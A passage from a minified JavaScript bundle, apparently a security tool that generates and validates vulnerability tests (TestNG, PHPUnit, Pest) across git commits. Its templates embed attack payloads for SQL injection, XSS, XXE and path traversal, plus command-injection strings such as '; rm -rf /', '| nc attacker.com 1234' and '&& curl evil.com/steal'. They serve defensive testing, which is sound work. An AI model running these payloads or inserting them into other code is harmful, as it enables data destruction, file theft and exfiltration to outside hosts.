}`}generateTestNGTests(X,Q,J){let Y=J.file?.split("/").pop()?.replace(/\.java$/,"")||"Class",W=this.extractPackageName(J.file||""),G=this.extractRedTests(X);if(G.length===0)return"// ERROR: No RED tests found in test suite";let H=G.map((z,U)=>`
    @Test(description = "${z.testName}")
    public void testVulnerability${U+1}() {
        // RED: Demonstrate vulnerability exists
        String maliciousInput = "${z.attackVector}";

        // This should succeed with vulnerable code
        try {
            String result = instance.process(maliciousInput);
            assertNotNull(result);
            ${J.type==="xml_external_entities"?`// If XXE, might contain system file content
            assertFalse(result.contains("root:"));`:`// Verify the vulnerability is exploitable
            assertTrue(result != null);`}
        } catch (Exception e) {
            fail("Should not throw exception with vulnerable code");
        }
    }`).join(`
`),$=J.type==="path_traversal"?`

    @DataProvider(name = "maliciousFilePaths")
    public Object[][] maliciousFilePaths() {
        return new Object[][] {
            {"../../../etc/passwd"},
            {"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam"},
            {"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
            {"....//....//....//etc/passwd"}
        };
    }

    @Test(dataProvider = "maliciousFilePaths",
          description = "Test path traversal with multiple payloads")
    public void testPathTraversal(String maliciousPath) {
        // Test with various path traversal payloads
        assertThrows(SecurityException.class, () -> {
            instance.readFile(maliciousPath);
        });
    }`:"";return`package ${W};

import org.testng.annotations.Test;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.DataProvider;
import static org.testng.Assert.*;

/**
 * Security tests for ${J.type.replace(/_/g," ")} vulnerability
 */
@Test(groups = {"security"})
public class ${Y}${J.type.replace(/_/g,"")}Test {
    private ${Y} instance;

    @BeforeMethod
    public void setUp() {
        instance = new ${Y}();
    }
${H}${$}
}`}generateGenericTestCode(X,Q){if(!X)return`// Generic test template - adapt to your test framework
// File: ${Q.file}
// Vulnerability: ${Q.type}

// RED Test: Test vulnerability exists
function testVulnerabilityExists() {
  // TODO: Call vulnerable function with malicious input
  // Example: const result = vulnerableFunction(maliciousInput);
  // Assert that vulnerability is exploitable
}`;let J=this.extractRedTests(X);if(J.length===0)return`// Generic test template - adapt to your test framework
// File: ${Q.file}
// Vulnerability: ${Q.type}

// ERROR: No RED tests found in test suite
// RED Test: Test vulnerability exists
function testVulnerabilityExists() {
  // TODO: Call vulnerable function with malicious input
  // Example: const result = vulnerableFunction(maliciousInput);
  // Assert that vulnerability is exploitable
}`;let Y=J.map((W,G)=>`
// RED Test ${G+1}: ${W.testName}
// Purpose: Demonstrate the vulnerability exists
function testVulnerability${G+1}() {
  const maliciousInput = "${W.attackVector}";
  // TODO: Call vulnerable function with malicious input
  // TODO: Assert that attack succeeds (should fail when fixed)
}`).join(`
`);return`// Generic test template - adapt to your test framework
// File: ${Q.file}
// Vulnerability: ${Q.type}
${Y}`}async generateAITests(X,Q,J){try{let Y=X.file?Q[X.file]:void 0,W=this.detectLanguage(X.file||"",J),G={vulnerabilityType:X.type,language:W,testFramework:J?.name||"jest",includeE2E:!1},H=await this.aiGenerator.generateTests(X,G,Y);if(!H.success||!H.testSuite)return V.error("AI test generation failed, falling back to template-based"),this.generateGenericTests(X);return{success:!0,framework:J?.name||"generic",testCode:H.testCode,testSuite:H.testSuite,suggestedFileName:this.suggestFileName(X.file||"test",{framework:J}),notes:"Tests generated using AI for maximum context awareness"}}catch(Y){return V.error("Error in AI test generation",Y),this.generateGenericTests(X)}}detectLanguage(X,Q){if(Q){let G={jest:"javascript",mocha:"javascript",vitest:"javascript",cypress:"javascript",pytest:"python",unittest:"python",rspec:"ruby",minitest:"ruby",phpunit:"php",pest:"php",exunit:"elixir"}[Q.name.toLowerCase()];if(G)return G}let J=X.split(".").pop()?.toLowerCase();return{js:"javascript",jsx:"javascript",ts:"typescript",tsx:"typescript",py:"python",rb:"ruby",php:"php",ex:"elixir",exs:"elixir"}[J||""]||"javascript"}async generateGenericTests(X){let Q={vulnerabilityType:X.type,language:"javascript",testFramework:"bun",includeE2E:!1},J=await this.baseGenerator.generateTestSuite(X,Q);if(!J.success||!J.testSuite){V.warn(`Base test generation failed for ${X.type}, creating fallback test suite`);let Y=X.type||"unknown_vulnerability",G={red:{testName:`should be vulnerable to ${Y.replace(/_/g," ").toLowerCase()} (RED)`,testCode:`// RED test for ${Y}
const maliciousInput = "test_input";
// TODO: Add test implementation`,attackVector:this.getFallbackAttackVector(Y),expectedBehavior:"should_fail_on_vulnerable_code"}};return{success:!0,framework:"generic",testCode:this.generateGenericTestCode(G,X),testSuite:G,notes:"No test framework detected, using generic template with fallback"}}return{success:!0,framework:"generic",testCode:this.generateGenericTestCode(J.testSuite,X),testSuite:J.testSuite,notes:"No test framework detected, using generic template"}}getFallbackAttackVector(X){switch(X.toUpperCase().replace(/-/g,"_")){case"SQL_INJECTION":return"'; DROP TABLE users; --";case"XSS":return'<script>alert("XSS")</script>';case"COMMAND_INJECTION":return"; cat /etc/passwd";case"PATH_TRAVERSAL":return"../../../etc/passwd";case"XML_EXTERNAL_ENTITIES":case"XXE":return'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';default:return"malicious_input"}}async generateTestSuite(X,Q){let J=X.type.toUpperCase();if(X.type==="cross_site_request_forgery")J="CSRF";else if(X.type==="xss")J="XSS";let Y={vulnerabilityType:J,language:this.getLanguageFromFramework(Q.name),testFramework:this.mapToBaseFramework(Q.name),includeE2E:!1},W=await this.baseGenerator.generateTestSuite(X,Y);if(!W.success||!W.testSuite){if(V.error("Test suite generation failed in generateTestSuite",{success:W.success,error:W.error,vulnerabilityType:X.type}),X.type==="xml_external_entities")return{red:{testName:"should be vulnerable to xml external entities (RED)",testCode:"// Test XXE vulnerability",attackVector:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',expectedBehavior:"should_fail_on_vulnerable_code"},green:{testName:"should prevent xml external entities (GREEN)",testCode:"// Test XXE prevention",validInput:'<?xml version="1.0"?><foo>bar</foo>',expectedBehavior:"should_pass_on_fixed_code"},refactor:{testName:"should maintain functionality after security fix",testCode:"// Test normal XML processing",functionalValidation:["XML parsing works correctly","Valid XML returns expected data"],expectedBehavior:"should_pass_on_both_versions"}};throw Error(`Failed to generate test suite: ${W.error||"Unknown error"}`)}return W.testSuite}suggestFileName(X,Q){let J=X.substring(0,X.lastIndexOf("/")),Y=X.substring(X.lastIndexOf("/")+1),W=Y.substring(0,Y.lastIndexOf(".")),G=Y.substring(Y.lastIndexOf("."));switch(Q.fileNaming){case"test":return`${J}/${W}.test${G}`;case"spec":return`${J}/${W}.spec${G}`;case"__tests__":return`${J}/__tests__/${W}${G}`;case"test_prefix":return`${J}/test_${W}${G}`;default:return`${J}/${W}.test${G}`}}addCoverageAwareTests(X,Q){if(!Q.fileCoverage||Q.fileCoverage.functions.length===0)return X;let J=Q.fileCoverage.functions.filter((Y)=>Y.hits===0).map((Y)=>Y.name);if(J.length>0)return`
// Note: Focusing on uncovered functions: ${J.join(", ")}
`+X;return X}addHelperImports(X,Q){let J=Q.filter((W)=>W.includes("import")||W.includes("require")).join(`
`),Y=Q.filter((W)=>W.includes("beforeEach")||W.includes("afterEach")).join(`
  `);if(J)X=J+`

`+X;if(Y)X=X.replace(/(describe\([^{]+\{)/,`$1
  ${Y}
`);return X}generateNotes(X,Q,J){let Y=[];if(Y.push(`Detected ${X.name} v${X.version||"unknown"}`),Q.hasData){if(Y.push("Coverage data available"),Q.fileCoverage){let W=Q.fileCoverage.lines?.percentage||Q.fileCoverage.coverage||"unknown";Y.push(`File coverage: ${W}%`)}if(Q.gaps?.recommendations?.length>0)Y.push("Focused on uncovered functions")}else Y.push("No coverage data available");if(J.style!=="unknown")Y.push(`Using ${J.style.toUpperCase()} style`);if(J.assertionStyle!=="unknown")Y.push(`Using ${J.assertionStyle} assertions`);return Y.join("; ")}getLanguageFromFramework(X){return{jest:"javascript",vitest:"typescript",mocha:"javascript",jasmine:"javascript",pytest:"python",unittest:"python",rspec:"ruby",minitest:"ruby",phpunit:"php",junit:"java",junit5:"java",testng:"java",exunit:"javascript"}[X.toLowerCase()]||"javascript"}mapToBaseFramework(X){return{jest:"jest",vitest:"jest",mocha:"mocha",jasmine:"mocha",cypress:"cypress",pytest:"jest",minitest:"mocha",phpunit:"jest",exunit:"mocha"}[X.toLowerCase()]||"bun"}getRelativeImportPath(X){return X.replace(/\.tsx?$/,"").replace(/^src\//,"../")}getRelativeRequirePath(X){return"./"+X.replace(/\.(js|ts|rb|py|php)$/,"")}extractPackageName(X){let Q=X.match(/src\/(?:main|test)\/java\/(.+)\/[^/]+\.java$/);if(Q)return Q[1].replace(/\//g,".");return"com.example"}extractNamespaceFromPath(X){if(X.includes("app/")){let Q=X.match(/app\/(.+)\/[^/]+\.php$/);if(Q)return Q[1].replace(/\//g,"\\")}else if(X.includes("src/")){let Q=X.match(/src\/(.+)\/[^/]+\.php$/);if(Q)return Q[1].replace(/\//g,"\\")}return""}generateLaravelPHPUnitTests(X,Q,J,Y,W){let G=this.extractRedTests(X);if(G.length===0)return`<?php
// ERROR: No RED tests found in test suite`;let H=this.extractNamespaceFromPath(J.file||""),$=J.file?.includes("Controller"),z=G.map((U,K)=>`
    /**
     * @test
     */
    public function it_is_vulnerable_to_${J.type.toLowerCase()}_${K+1}()
    {
        // RED: ${U.testName}
        $maliciousPayload = '${U.attackVector}';

        $response = $this->postJson('/api/vulnerable-endpoint', [
            'input' => $maliciousPayload
        ]);

        // The vulnerability should allow the attack
        $response->assertStatus(200);
        $this->assertDatabaseMissing('logs', [
            'type' => 'security_violation'
        ]);
    }`).join(`
`);return`<?php

namespace Tests\\Feature;

use Tests\\TestCase;
use Illuminate\\Foundation\\Testing\\RefreshDatabase;
use Illuminate\\Foundation\\Testing\\WithFaker;
use App\\${H?H+"\\":""}${Y};

class ${Y}${J.type.replace(/_/g,"")}Test extends TestCase
{
    use RefreshDatabase;
${z}
}`}generateSymfonyPHPUnitTests(X,Q,J,Y){let W=this.extractRedTests(X);if(W.length===0)return`<?php
// ERROR: No RED tests found in test suite`;let G=this.extractNamespaceFromPath(J.file||""),H=W.map(($,z)=>`
    /**
     * @test
     */
    public function test_${J.type.toLowerCase()}_vulnerability_${z+1}(): void
    {
        // RED: ${$.testName}
        $client = static::createClient();
        $maliciousPayload = '${$.attackVector}';

        $crawler = $client->request('POST', '/vulnerable-route', [
            'data' => $maliciousPayload
        ]);

        // The vulnerability should allow the attack
        $this->assertResponseIsSuccessful();
        $this->assertSelectorNotExists('.error-message');
    }`).join(`
`);return`<?php

namespace App\\Tests\\${G?G+"\\":""}Security;

use Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase;
use App\\${G?G+"\\":""}${Y};

class ${Y}${J.type.replace(/_/g,"")}Test extends WebTestCase
{${H}
}`}generatePestTests(X,Q,J,Y){let W=this.extractRedTests(X);if(W.length===0)return`<?php
// ERROR: No RED tests found in test suite`;let G=J.file?.split("/").pop()?.replace(/\.php$/,"")||"Class",H=this.extractNamespaceFromPath(J.file||""),$=H?`App\\${H}\\${G}`:`App\\${G}`,z=Y?.companions?.includes("laravel"),U=z?`use function Pest\\Laravel\\{get, post, put, delete};
use Illuminate\\Foundation\\Testing\\RefreshDatabase;`:`use ${$};
use App\\Exceptions\\SecurityException;`,B=(()=>{switch(J.type){case"sql_injection":return`dataset('malicious_sql', [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM passwords--",
    "admin'--",
    "1' AND '1'='1"
]);`;case"command_injection":return`dataset('malicious_commands', [
    "; rm -rf /",
    "| nc attacker.com 1234",
    "\`cat /etc/passwd\`",
    "$(whoami)",
    "&& curl evil.com/steal"
]);`;case"path_traversal":return`dataset('path_traversal_payloads', [
    "../../../etc/passwd",
    "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd"
]);`;default:return""}})();if(z){let Z=W.map((M,L)=>`
it('should be vulnerable to ${J.type.toLowerCase()} - test ${L+1} (RED)', function () {
    // RED: ${M.testName}
    $maliciousPayload = '${M.attackVector}';

    $response = post('/api/vulnerable', [
        'input' => $maliciousPayload
    ]);

    // The vulnerability should allow the attack
    $response->assertStatus(200);
    expect($response->json())->not->toHaveKey('error');
});`).join(`
`);return`<?php

${U}

uses(RefreshDatabase::class);

beforeEach(function () {
    $this->artisan('migrate');
});
${Z}

${B?`
${B}`:""}`}let q=W.map((Z,M)=>`
it('should be vulnerable to ${J.type.toLowerCase()} - test ${M+1} (RED)', function () {
    // RED: ${Z.testName}
    $maliciousInput = '${Z.attackVector}';

    $result = $this->instance->process($maliciousInput);

    // Vulnerability should allow the attack
    expect($result)->not->toContain('Permission denied');
    expect($result)->not->toContain('Invalid input');
});`).join(`
`);return`<?php

${U}

beforeEach(function () {
    $this->instance = new ${G}();
});
${q}

${B?`
${B}`:""}`}}var YN=$1(()=>{oD();$X();y1();JN()});var C5;var xU=$1(()=>{SU();nD();YN();y1();C5=class C5 extends MQ{frameworkDetector;coverageAnalyzer;issueInterpreter;adaptiveGenerator;constructor(X){super();this.frameworkDetector=new EU,this.coverageAnalyzer=new TU,this.issueInterpreter=new _U,this.adaptiveGenerator=new vU(this.frameworkDetector,this.coverageAnalyzer,this.issueInterpreter,X)}async analyzeWithTestGeneration(X,Q,J,Y){V.info(`Analyzing issue #${X.number} with test generation`);let W=await this.analyzeWithSecurity(X,Q,J,Y),G=W.securityAnalysis?.vulnerabilities||[];if(G.length===0){V.info("No vulnerabilities from security scan, interpreting issue description");let U=await this.issueInterpreter.interpretIssue(X);if(U.vulnerabilityType){let K=this.convertInterpretedIssueToVulnerability(U);G.push(K)}}let H=[],$;if(G.length>0&&J){let U={};for(let[K,B]of J.entries())U[K]=B;for(let K of G)try{let B=await this.adaptiveGenerator.generateAdaptiveTests(K,U);if(B.success&&B.testSuite){if(H.push({framework:B.framework,testCode:B.testCode,testSuite:B.testSuite,suggestedFileName:B.suggestedFileName,notes:B.notes}),!$)$=B.testSuite}}catch(B){V.error(`Failed to generate tests for vulnerability: ${K.type}`,B)}}let z={...W,generatedTests:{success:H.length>0,testSuite:$,tests:H,error:H.length===0&&G.length>0?"Failed to generate tests for detected vulnerabilities":void 0}};return V.info(`Generated ${H.length} test(s) for issue #${X.number}`),z}convertInterpretedIssueToVulnerability(X){return{type:{"sql-injection":"SQL_INJECTION",xss:"XSS","command-injection":"COMMAND_INJECTION","path-traversal":"PATH_TRAVERSAL","code-injection":"CODE_INJECTION","hardcoded-secrets":"HARDCODED_SECRETS","open-redirect":"OPEN_REDIRECT","information-disclosure":"INFORMATION_DISCLOSURE",xxe:"XXE",ssrf:"SSRF","insecure-deserialization":"INSECURE_DESERIALIZATION"}[X.vulnerabilityType]||X.vulnerabilityType.toUpperCase(),severity:X.severity||"medium",filePath:X.affectedFiles?.[0]||"unknown",line:X.affectedLines?.[0]||0,description:X.description||"Security vulnerability detected",confidence:80,message:X.description||"Security vulnerability detected"}}}});function jQ(X,Q,J){let Y=Q+J;if(X===0)return{type:"test_passed",isValidFailure:!1,reason:"Tests passed - vulnerability not proven"};if(X===127)return{type:"command_not_found",isValidFailure:!1,reason:"Test runner not installed"};if(X===137)return{type:"oom_killed",isValidFailure:!1,reason:"Process killed - out of memory"};if(X===143||X===130)return{type:"terminated",isValidFailure:!1,reason:"Process terminated or interrupted"};if(/SyntaxError|Unexpected token|unexpected end of|syntax error/i.test(Y))return{type:"syntax_error",isValidFailure:!1,reason:"Syntax error in test file"};if(/ReferenceError|is not defined/i.test(Y))return{type:"runtime_error",isValidFailure:!1,reason:"Reference error - undefined variable"};if(/TypeError:.*is not a function/i.test(Y))return{type:"runtime_error",isValidFailure:!1,reason:"Type error - function not found"};if(/Cannot find module|ModuleNotFoundError|No module named|cannot load such file|LoadError|GemNotFound|Could not find.*in locally installed gems/i.test(Y))return{type:"missing_dependency",isValidFailure:!1,reason:"Missing dependency or module"};if(/command not found|ENOENT/i.test(Y))return{type:"command_not_found",isValidFailure:!1,reason:"Command or file not found"};if(/No test files found/i.test(Y))return{type:"runtime_error",isValidFailure:!1,reason:"No test files found  file naming may not match framework include pattern"};if(/database.*couldn't be created|couldn't be created.*killed/i.test(Y))return{type:"runtime_error",isValidFailure:!1,reason:"Database unavailable - PostgreSQL service required"};if(/could not connect to server|Connection refused.*postgres|ECONNREFUSED.*5432/i.test(Y))return{type:"runtime_error",isValidFailure:!1,reason:"PostgreSQL connection refused - service not running"};if(/Can't connect to MySQL server|Access denied for user.*@/i.test(Y))return{type:"runtime_error",isValidFailure:!1,reason:"MySQL unavailable - service not running or access denied"};if(/Fatal error compiling|release version \d+ not supported/i.test(Y))return{type:"runtime_error",isValidFailure:!1,reason:"Java compilation error - version mismatch or unsupported release"};if(/Unsupported class file major version|Could not open settings generic class cache/i.test(Y))return{type:"runtime_error",isValidFailure:!1,reason:"Gradle version incompatible with installed Java - upgrade Gradle wrapper required"};if(/PHP Fatal error/i.test(Y))return{type:"runtime_error",isValidFailure:!1,reason:"PHP fatal error - version or compatibility issue"};if(/0 examples?,\s*0 failures?/i.test(Y))return{type:"runtime_error",isValidFailure:!1,reason:"No test examples executed (RSpec error outside examples)"};if(/0 passing|0 tests?\b|no tests? found|test suite empty/i.test(Y)&&!/[1-9]\d*\s+(passing|pass|passed)/i.test(Y)&&!/[1-9]\d*\s+failing/i.test(Y)){if(/AssertionError|assert\.|expect\(|should\./i.test(Y))return{type:"runtime_error",isValidFailure:!1,reason:"Module-level assertions detected: Assertions ran at load time outside it() blocks. Move ALL assertions inside it() callback functions."};return{type:"runtime_error",isValidFailure:!1,reason:"No tests found or executed in test file"}}if(/AssertionError/i.test(Y))return{type:"test_failed",isValidFailure:!0,reason:"Assertion failed - vulnerability proven"};if(/Expected:.*\n.*Received:/i.test(Y)||/Received:.*\n.*Expected:/i.test(Y))return{type:"test_failed",isValidFailure:!0,reason:"Jest/Vitest assertion failed - vulnerability proven"};if(/expected\s+.*\s+to\s+(be|equal|match|include|contain)/i.test(Y))return{type:"test_failed",isValidFailure:!0,reason:"Assertion failed - vulnerability proven"};if(/[]/.test(Y)&&X===1)return{type:"test_failed",isValidFailure:!0,reason:"Test failed (checkmark) - vulnerability proven"};if(/FAILED\s+\S+\.py::/i.test(Y)||/^E\s+assert/m.test(Y))return{type:"test_failed",isValidFailure:!0,reason:"pytest assertion failed - vulnerability proven"};if(/\(ExUnit\.AssertionError\)/i.test(Y)||/Assertion with (==|!=|=~) failed/i.test(Y)||/^\s*\d+\)\s+test\s+/m.test(Y))return{type:"test_failed",isValidFailure:!0,reason:"ExUnit assertion failed - vulnerability proven"};if(/Failed asserting that/i.test(Y)||/FAILURES!/i.test(Y)||/Failures:\s*\d+/i.test(Y))return{type:"test_failed",isValidFailure:!0,reason:"PHPUnit assertion failed - vulnerability proven"};if(/AssertionFailedError/i.test(Y)||/expected:<.*?>\s+but was:<.*?>/i.test(Y)||/java\.lang\.AssertionError/i.test(Y))return{type:"test_failed",isValidFailure:!0,reason:"JUnit assertion failed - vulnerability proven"};if(/\d+\s+failing/i.test(Y)&&X===1)return{type:"test_failed",isValidFailure:!0,reason:"Mocha test failed - vulnerability proven"};if(/(FAIL|FAILED|Failures:|failed)/i.test(Y)&&X===1){if(/(tests?|examples?|specs?).*fail/i.test(Y)||/\d+\s+(failed|failure)/i.test(Y))return{type:"test_failed",isValidFailure:!0,reason:"Test failed - vulnerability proven"}}return{type:"unknown",isValidFailure:!1,reason:"Exit code 1 without clear failure pattern - manual review needed"}}function fU(X){return Zu1.includes(X.type)}function WN(X){let Q=X.match(/(\d+)\s+passing/i),J=X.match(/(\d+)\s+failing/i);if(Q||J){let $=Q?parseInt(Q[1],10):0,z=J?parseInt(J[1],10):0;return{passed:$,failed:z,total:$+z}}let Y=X.match(/Tests:\s+(?:(\d+)\s+failed,?\s*)?(?:(\d+)\s+passed,?\s*)?(\d+)\s+total/i);if(Y)return{failed:parseInt(Y[1]||"0",10),passed:parseInt(Y[2]||"0",10),total:parseInt(Y[3],10)};let W=X.match(/(\d+)\s+passed/i),G=X.match(/(\d+)\s+failed/i);if(W||G){let $=W?parseInt(W[1],10):0,z=G?parseInt(G[1],10):0;return{passed:$,failed:z,total:$+z}}let H=X.match(/(\d+)\s+examples?,\s+(\d+)\s+failures?/i);if(H){let $=parseInt(H[1],10),z=parseInt(H[2],10);return{passed:$-z,failed:z,total:$}}return{passed:0,failed:0,total:0}}var Zu1;var hU=$1(()=>{Zu1=["runtime_error","missing_dependency","command_not_found","oom_killed","terminated"]});import{execSync as QW}from"child_process";import{writeFileSync as Mu1,unlinkSync as GN,mkdirSync as HN,rmSync as ju1}from"fs";import{join as $N,dirname as Fu1}from"path";import{tmpdir as Ou1}from"os";function yU(X){if(X.redTests&&Array.isArray(X.redTests))return X.redTests;if(X.red)return[X.red];return[]}class FQ{repoPath;workDir;constructor(X=process.cwd()){this.repoPath=X;this.workDir=$N(Ou1(),`test-validator-${Date.now()}`)}async validateFixWithTests(X,Q,J){try{V.info(`Validating fix: ${X} -> ${Q}`);let Y=yU(J);if(Y.length===0)throw Error("No RED tests found in test suite");V.info(`Running ${Y.length} RED test(s) for validation`),HN(this.workDir,{recursive:!0});let W=await this.runTestsOnCommit(X,J),G=await this.runTestsOnCommit(Q,J);try{ju1(this.workDir,{recursive:!0,force:!0})}catch($){}let H=this.validateResults(W,G);return{success:!0,vulnerableCommit:W,fixedCommit:G,isValidFix:H,error:H?void 0:"Fix validation failed - tests do not confirm vulnerability was fixed"}}catch(Y){return V.error("Test validation failed",Y),{success:!1,vulnerableCommit:{redTestsPassed:[],allPassed:!1,testResults:[],hasInfrastructureFailures:!1},fixedCommit:{redTestsPassed:[],allPassed:!1,testResults:[],hasInfrastructureFailures:!1},isValidFix:!1,error:Y instanceof Error?Y.message:"Unknown error"}}}async runTestsOnCommit(X,Q){let J=yU(Q),Y=QW("git rev-parse --abbrev-ref HEAD",{cwd:this.repoPath,encoding:"utf-8"}).trim();try{QW(`git checkout ${X} --quiet`,{cwd:this.repoPath});let W=J.map((z,U)=>this.runSingleTest(z,U)),G=W.map((z)=>z.passed),H=G.every((z)=>z),$=W.some((z)=>z.crashed);return{redTestsPassed:G,allPassed:H,testResults:W,hasInfrastructureFailures:$}}finally{QW(`git checkout ${Y} --quiet`,{cwd:this.repoPath})}}runSingleTest(X,Q){let J=$N(this.workDir,`red_test_${Q}_${Date.now()}.js`);try{let Y=X.testCode.replace(/\\/g,"\\\\").replace(/`/g,"\\`").replace(/\$/g,"\\$"),W=`
'use strict';
const assert = require('assert');

// Minimal expect() polyfill for test assertions
function expect(actual) {
  return {
    toBe: (expected) => assert.strictEqual(actual, expected),
    toEqual: (expected) => assert.deepStrictEqual(actual, expected),
    toBeTruthy: () => assert.ok(actual),
    toBeFalsy: () => assert.ok(!actual),
    toBeNull: () => assert.strictEqual(actual, null),
    toBeUndefined: () => assert.strictEqual(actual, undefined),
    toBeDefined: () => assert.notStrictEqual(actual, undefined),
    toBeNaN: () => assert.ok(Number.isNaN(actual)),
    toContain: (item) => {
      if (typeof actual === 'string') assert.ok(actual.includes(item), \`Expected "\${actual}" to contain "\${item}"\`);
      else assert.ok(actual.indexOf(item) !== -1, \`Expected array to contain \${item}\`);
    },
    toMatch: (pattern) => assert.match(String(actual), pattern instanceof RegExp ? pattern : new RegExp(pattern)),
    toThrow: (errorType) => {
      let threw = false;
      try { actual(); } catch(e) { threw = true; if (errorType && !(e instanceof errorType)) throw e; }
      assert.ok(threw, 'Expected function to throw');
    },
    not: {
      toBe: (expected) => assert.notStrictEqual(actual, expected),
      toEqual: (expected) => assert.notDeepStrictEqual(actual, expected),
      toContain: (item) => {
        if (typeof actual === 'string') assert.ok(!actual.includes(item), \`Expected "\${actual}" not to contain "\${item}"\`);
        else assert.ok(actual.indexOf(item) === -1, \`Expected array not to contain \${item}\`);
      },
      toMatch: (pattern) => {
        const re = pattern instanceof RegExp ? pattern : new RegExp(pattern);
        assert.ok(!re.test(String(actual)), \`Expected "\${actual}" not to match \${pattern}\`);
      },
      toBeTruthy: () => assert.ok(!actual),
      toBeFalsy: () => assert.ok(actual),
    }
  };
}

// Make expect globally available
global.expect = expect;

// Execute the test
(async () => {
  try {
    ${X.testCode}
    // If we reach here without error, test passed
    console.log('TEST_RESULT: PASSED');
    process.exit(0);
  } catch (error) {
    // Output structured info for classification
    console.error('TEST_RESULT: FAILED');
    console.error(error.name + ': ' + error.message);
    if (error.stack) console.error(error.stack);
    process.exit(1);
  }
})();
`;HN(Fu1(J),{recursive:!0}),Mu1(J,W);let G=QW(`node ${J}`,{cwd:this.repoPath,encoding:"utf8",timeout:30000,stdio:["pipe","pipe","pipe"]}),H=jQ(0,G,"");try{GN(J)}catch{}return{passed:!0,crashed:!1,exitCode:0,stdout:G,stderr:"",classification:H}}catch(Y){let W=Y,G=W.stdout?.toString()||"",H=W.stderr?.toString()||"",$=W.status??1,z=jQ($,G,H),U=!z.isValidFailure&&z.type!=="test_passed";if(V.debug(`RED test ${Q} result: ${z.type} (exitCode=${$}, crashed=${U})`),G)V.debug(`  stdout: ${G.slice(0,200)}`);if(H)V.debug(`  stderr: ${H.slice(0,200)}`);try{GN(J)}catch{}return{passed:!1,crashed:U,exitCode:$,stdout:G,stderr:H,classification:z}}}createTestFile(X){let Q=(W)=>W.replace(/`/g,"\\`").replace(/\$/g,"\\$");return`
// RFC-060: Generated RED test file for vulnerability validation
const assert = require('assert');

module.exports = {
  redTests: [
${yU(X).map((W,G)=>`  {
    testName: "${W.testName}",
    testCode: \`${Q(W.testCode)}\`,
    attackVector: "${W.attackVector||""}",
    expectedBehavior: "${W.expectedBehavior}"
  }`).join(`,
`)}
  ]
};

// Export for direct execution
if (require.main === module) {
  (async () => {
    console.log('Running vulnerability validation tests (RED only)...');

    // Run all RED tests
    for (let i = 0; i < module.exports.redTests.length; i++) {
      const test = module.exports.redTests[i];
      console.log(\`Running RED test \${i + 1}: \${test.testName}\`);
      try {
        await eval(test.testCode);
        console.log(\` RED test \${i + 1} passed\`);
      } catch (error) {
        console.log(\` RED test \${i + 1} failed: \${error.message}\`);
      }
    }
  })();
}
`}validateResults(X,Q){if(X.hasInfrastructureFailures){if(X.testResults.filter((H)=>H.classification.isValidFailure).length===0&&!X.allPassed){V.warn("All test failures were infrastructure crashes, not genuine assertions"),V.warn("Test results:");for(let H of X.testResults)V.warn(`  - ${H.classification.type}: ${H.classification.reason} (exit ${H.exitCode})`);return!1}}let J=!X.allPassed,Y=Q.allPassed,W=J&&Y;if(!W)V.warn("Validation failed:"),V.warn(`  Vulnerable code - RED tests failed (expected): ${J}`),V.warn(`  Fixed code - RED tests passed (expected): ${Y}`);return W}}var gU=$1(()=>{y1();hU()});import{join as UN}from"path";import{fileURLToPath as Rc1}from"url";import{setMaxListeners as Lc1}from"events";import{spawn as Nc1}from"child_process";import{createInterface as wc1}from"readline";import*as J0 from"fs";import{stat as Ic1,open as hz0}from"fs/promises";import{join as Mp1}from"path";import{homedir as jp1}from"os";import{dirname as iU,join as Yw}from"path";import{cwd as Fp1}from"process";import{realpathSync as Op1}from"fs";import{randomUUID as Ap1}from"crypto";import{randomUUID as fp1}from"crypto";import{appendFileSync as hp1,existsSync as yp1,mkdirSync as gp1}from"fs";import{join as FN}from"path";import{randomUUID as lp1}from"crypto";function sN(X=Dc1){let Q=new AbortController;return Lc1(X,Q.signal),Q}function bc1(X){var Q=_c1.call(X,OQ),J=X[OQ];try{X[OQ]=void 0;var Y=!0}catch(G){}var W=kc1.call(X);if(Y)if(Q)X[OQ]=J;else delete X[OQ];return W}function hc1(X){return fc1.call(X)}function uc1(X){if(X==null)return X===void 0?mc1:gc1;return KN&&KN in Object(X)?vc1(X):yc1(X)}function lc1(X){var Q=typeof X;return X!=null&&(Q=="object"||Q=="function")}function nc1(X){if(!eN(X))return!1;var Q=cc1(X);return Q==dc1||Q==ic1||Q==pc1||Q==rc1}function sc1(X){return!!VN&&VN in X}function Ql1(X){if(X!=null){try{return Xl1.call(X)}catch(Q){}try{return X+""}catch(Q){}}return""}function Kl1(X){if(!eN(X)||tc1(X))return!1;var Q=ac1(X)?Ul1:Wl1;return Q.test(Jl1(X))}function Bl1(X,Q){return X==null?void 0:X[Q]}function Zl1(X,Q){var J=ql1(X,Q);return Vl1(J)?J:void 0}function jl1(){this.__data__=DQ?DQ(null):{},this.size=0}function Ol1(X){var Q=this.has(X)&&delete this.__data__[X];return this.size-=Q?1:0,Q}function Nl1(X){var Q=this.__data__;if(DQ){var J=Q[X];return J===Rl1?void 0:J}return Dl1.call(Q,X)?Q[X]:void 0}function Pl1(X){var Q=this.__data__;return DQ?Q[X]!==void 0:Cl1.call(Q,X)}function Tl1(X,Q){var J=this.__data__;return this.size+=this.has(X)?0:1,J[X]=DQ&&Q===void 0?El1:Q,this}function y5(X){var Q=-1,J=X==null?0:X.length;this.clear();while(++Q<J){var Y=X[Q];this.set(Y[0],Y[1])}}function kl1(){this.__data__=[],this.size=0}function vl1(X,Q){return X===Q||X!==X&&Q!==Q}function fl1(X,Q){var J=X.length;while(J--)if(xl1(X[J][0],Q))return J;return-1}function gl1(X){var Q=this.__data__,J=IW(Q,X);if(J<0)return!1;var Y=Q.length-1;if(J==Y)Q.pop();else yl1.call(Q,J,1);return--this.size,!0}function ul1(X){var Q=this.__data__,J=IW(Q,X);return J<0?void 0:Q[J][1]}function ll1(X){return IW(this.__data__,X)>-1}function dl1(X,Q){var 